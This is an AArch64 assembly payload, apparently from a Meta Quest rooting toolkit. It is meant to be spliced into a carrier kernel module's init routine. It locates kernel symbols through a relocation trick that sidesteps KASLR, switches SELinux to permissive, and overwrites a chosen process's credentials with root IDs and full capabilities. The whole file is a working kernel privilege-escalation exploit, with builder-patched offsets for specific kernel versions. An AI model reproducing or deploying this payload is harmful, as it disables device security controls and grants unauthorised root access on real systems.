// Merged enforcing=0 + cred-patch, spliced into a NOT-loaded carrier's init_module (e.g.
// usbip-vudc / rdbg). Relocation-based anchor: the builder points an R_AARCH64_ABS64 reloc at the
// anchor64 data slot, so the kernel module loader writes the REAL (KASLR-slid) address of
// __platform_driver_register there at load time. We read it as data -> pdr. This avoids CALL26,
// which the module loader routes through a PLT veneer when the module is out of direct-branch range
// (true on Quest Pro 4.19), so decoding the bl would yield the veneer, not the symbol. find_vpid/
// pid_task/selinux_state/ssuse are pdr + per-kernel deltas (from vmlinux). Roots the task pid=<baked>.
// movz/movk immediates + the ABS64 anchor are patched by the builder. @ENF_OFF@ = selinux_state.
// enforcing byte offset (0 on 5.10, 1 on 4.19), @CRED_OFF@ = task_struct->cred (0x778 Q3 / 0x7e8 QPro).
.section .patch,"ax"
.globl _start
_start:
    paciasp
    stp x29, x30, [sp, #-64]!
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    mov x29, sp
    // pdr (x19) = &__platform_driver_register, written here by the kernel via R_AARCH64_ABS64
    adr x0, anchor64
    ldr x19, [x0]
    b   skip
    .balign 8
anchor64:
    .quad 0                      // R_AARCH64_ABS64 -> __platform_driver_register (patched by builder)
skip:
    // enforcing = 0 : selinux_state = pdr + DSEL
    movz w1, #0                  // [P0] DSEL_lo
    movk w1, #0, lsl #16         // [P1] DSEL_hi
    add  x2, x19, w1, sxtw       // x2 = &selinux_state
    strb wzr, [x2, #@ENF_OFF@]   // enforcing = 0 (byte @ +@ENF_OFF@)
    // sync SELinux status page so userspace libselinux sees permissive:
    // selinux_status_update_setenforce(&selinux_state, 0) = pdr + DSSUSE
    movz w3, #0                  // [P2] DSSUSE_lo
    movk w3, #0, lsl #16         // [P3] DSSUSE_hi
    add  x4, x19, w3, sxtw
    mov  x0, x2                  // arg0 = &selinux_state
    mov  x1, xzr                 // arg1 = enforcing = 0
    blr  x4
    // find_vpid = pdr + DFV (x20)
    movz w1, #0                  // [P2] DFV_lo
    movk w1, #0, lsl #16         // [P3] DFV_hi
    add  x20, x19, w1, sxtw
    // pid_task = pdr + DPT (x21)
    movz w1, #0                  // [P4] DPT_lo
    movk w1, #0, lsl #16         // [P5] DPT_hi
    add  x21, x19, w1, sxtw
    // find_vpid(pid)
    movz w0, #0                  // [P6] PID_lo
    movk w0, #0, lsl #16         // [P7] PID_hi
    blr  x20
    cbz  x0, done
    // pid_task(pid_struct, PIDTYPE_PID=0)
    mov  x1, #0
    blr  x21
    cbz  x0, done
    // cred = task->cred ; patch to root
    ldr  x2, [x0, #@CRED_OFF@]
    stp  wzr, wzr, [x2, #4]      // uid, gid
    stp  wzr, wzr, [x2, #12]     // suid, sgid
    stp  wzr, wzr, [x2, #20]     // euid, egid
    stp  wzr, wzr, [x2, #28]     // fsuid, fsgid
    mov  x3, #-1
    stp  x3, x3, [x2, #40]       // cap_inheritable, cap_permitted
    stp  x3, x3, [x2, #56]       // cap_effective, cap_bset
    str  x3, [x2, #72]           // cap_ambient
@CTX@
done:
    mov w0, wzr                  // return 0 (init success; module stays loaded, rmmod'd in postex)
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #64
    autiasp
    ret
